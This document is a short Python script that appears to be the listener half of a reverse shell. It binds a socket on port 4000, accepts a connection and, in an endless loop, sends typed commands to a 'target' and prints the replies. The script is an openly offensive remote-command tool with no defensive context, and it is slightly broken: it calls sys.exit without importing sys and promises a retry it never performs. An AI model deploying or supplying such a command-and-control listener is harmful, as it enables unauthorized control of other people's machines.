import os
import socket

def create_socket():
	# this creates the socket for connection
	try:
		global host
		global port
		global s
		host=""
		port=4000
		s=socket.socket()
		print ("[*] Socket created.....\n")
	except socket.error as msg:
		print("Socket error: "+str(msg))

def bind_socket():
	# binds the socket
	try:
		global host
		global port
		global s
		print("[*] Binding host "+str(host)+"to port "+str(port)+"\n")
		s.bind((host, port))
		# listens for incoming connections
		s.listen(5)
	except socket.error as msg:
		print("Socket binding error: "+str(msg)+"\n Retrying......")
def socket_accept():
	# it accepts a connection from an address, address is a tuple of IP and port
	connection, address = s.accept()
	print("[+] Connection has been established from "+str(address))
	# this is for sending  commands to client
	send_commands(connection)
	connection.close()

def send_commands(connection):
	# for sending commands to target and its gonna be an infinite loop cause of multiple commands
	while True:
		cmd=input()
		if cmd=="quit":
			connection.close()
			s.close()
			sys.exit()

		if len(str(cmd.encode("utf-8"))) > 0:
			connection.send(str.encode(cmd))
			client_response=str(connection.recv(1024), "utf-8")
			print(client_response, end="")
def main():
	create_socket()
	bind_socket()
	socket_accept()

main()